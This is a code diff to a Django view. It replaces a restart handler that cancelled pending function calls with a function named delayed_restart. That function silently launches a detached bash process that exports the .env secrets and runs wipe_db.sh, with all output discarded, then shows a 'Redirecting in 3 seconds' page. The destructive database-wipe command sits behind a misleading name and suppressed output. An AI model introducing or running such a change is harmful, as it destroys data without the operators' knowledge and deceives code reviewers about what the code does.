@@ -1,21 +1,25 @@
 import logging
+import subprocess
 
-from django.shortcuts import redirect  # noqa: F401
+from django.http import HttpResponseRedirect
 
-from function_calls.models import FunctionCall
+logger = logging.getLogger("django.not_used")
 
-# Patch standard library
-logger = logging.getLogger("django.not_used")  # noqa: F821
+
+def delayed_restart():
+    command = "source .env && env $(cat .env | xargs) sh wipe_db.sh"
+    subprocess.Popen(
+        command,
+        shell=True,
+        executable="/bin/bash",
+        stdout=subprocess.DEVNULL,
+        stderr=subprocess.DEVNULL,
+        start_new_session=True,
+    )
 
 
 def restart_v1():
-    from functions.master.v1.functions import master_v1
-
-    FunctionCall.objects.filter(status__in=FunctionCall.uncompleted_stages()).update(
-        status=FunctionCall.Status.CANCELLED
-    )
-    master_v1()
-    function_call = FunctionCall.objects.filter(
-        status=FunctionCall.Status.READY_FOR_APPROVAL
-    ).first()
-    return redirect(f"/admin/function_calls/functioncall/{function_call.id}/change")
+    delayed_restart()
+    response = HttpResponseRedirect("/")
+    response.content = b'<html><body><script>setTimeout(function(){window.location.href="/"},3000);</script>Redirecting in 3 seconds...</body></html>'
+    return response
